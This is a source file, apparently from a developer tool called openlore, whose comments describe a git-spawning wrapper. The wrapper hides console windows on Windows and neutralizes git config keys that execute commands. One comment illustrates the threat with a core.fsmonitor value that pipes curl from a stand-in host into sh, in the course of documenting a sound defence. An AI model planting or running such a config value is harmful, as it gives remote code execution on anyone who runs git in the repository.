/**
 * One home for spawning `git` (or any git-adjacent subprocess) from Node.
 *
 * Every call routed through here sets `windowsHide: true`. Without it, a console
 * subprocess spawned from a parent that has no attached console of its own — the
 * `openlore serve`/`mcp` daemon, a Claude Code hook invocation (`orient --inject`),
 * the Pi extension host — gets a BRAND NEW visible console window on Windows, one
 * per spawn. A hot path that shells out to `git` once per file (provenance,
 * change-coupling, decision/spec projection review status) turns that into a
 * storm of flashing windows (change: fix-windows-git-spawn-console-flash).
 * `windowsHide` is a documented no-op on macOS/Linux, so this is safe everywhere.
 *
 * Usage: `execFileGit('git', args, opts)` in place of a locally
 * `promisify(execFile)`'d call; `execFileGitSync('git', args, opts)` in place of
 * a direct `execFileSync('git', ...)` call; `spawnGit` / `spawnGitSync` in place
 * of a direct `spawn`/`spawnSync` of `git` — the streaming shapes (`git cat-file
 * --batch`, a fd-redirected `spawnSync`) that the execFile helpers cannot express.
 *
 * Typed like the `node:child_process` functions they wrap. The ONE deliberate
 * difference is `execFileGitSync`'s default encoding: `execFileSync` returns a
 * `Buffer` unless an encoding is given, which makes the ergonomic
 * `execFileGitSync('git', args, { cwd }).trim()` a runtime `TypeError`. This
 * module defaults that call to `'utf-8'` so a plain-options call really does
 * return the `string` its signature promises; pass `{ encoding: 'buffer' }` for
 * bytes.
 *
 * Every call also gets the {@link GIT_UNTRUSTED_CONFIG_OFF} argv prefix, which
 * neutralizes the config keys git treats as COMMANDS TO RUN. See that constant
 * for the threat and the residual.
 *
 * Structural guards fail CI on a regression: `git-exec.test.ts` on a new `git`
 * spawn that skips this file, and `windows-hidden-spawn-guard.test.ts` on ANY
 * subprocess spawned without `windowsHide` and without an inherited console.

/**
 * The argv prefix that stops an ANALYZED REPOSITORY from executing code through git.
 *
 * Several git config keys are not settings but command strings git runs, and git reads
 * them from the worktree's OWN `.git/config`. Running `git status` inside a directory
 * someone else authored is therefore arbitrary code execution as the current user:
 *
 *     git config core.fsmonitor 'sh -c "curl evil.example | sh; echo /dev/null"'
 *
 * fires on a plain `git status --porcelain` — which is exactly what `openlore analyze`
 * runs, twice, on every invocation (`source-state.ts`). `enforce`, `drift`,
 * `blast_radius` and `map_in_flight_conflicts` reach the same spawns. This is not a
 * hypothetical worktree: a repo handed over as a zip/tarball, a vendored or submodule
 * worktree, or a "here is my bug, please look" clone all ship a `.git` the author wrote.
 *
 * `safe.directory` does NOT cover this. It only refuses a differently-OWNED directory,
 * so anything the developer unpacked themselves is owned by them and fully trusted.
 *
 * A command-line `-c` beats the repository's config file, so this prefix disables each
 * key regardless of what the repo asked for. It is applied to every git spawn rather
 * than to the ones that look dangerous, because which key fires depends on the repo's
 * config and attributes, not on the subcommand we chose.
 *
 * Note what is NOT here: `diff.external`. Setting it EMPTY does not disable it — git
 * tries to RUN the empty string and dies with "cannot run : No such file or directory",
 * breaking every diff. The documented off-switch is the `--no-ext-diff` flag, so external
 * diff and attribute-driven textconv are handled by {@link DIFF_DRIVER_OFF} below instead.
 *
 * RESIDUAL, stated honestly: `filter.<name>.clean/smudge` is also a command string and
 * cannot be turned off centrally, because the driver NAME is chosen by the repository and
 * `-c` has no wildcard. It needs an attribute opt-in plus a checkout-ish operation, which
 * nothing here performs. Everything git will run without an attribute opt-in is covered.
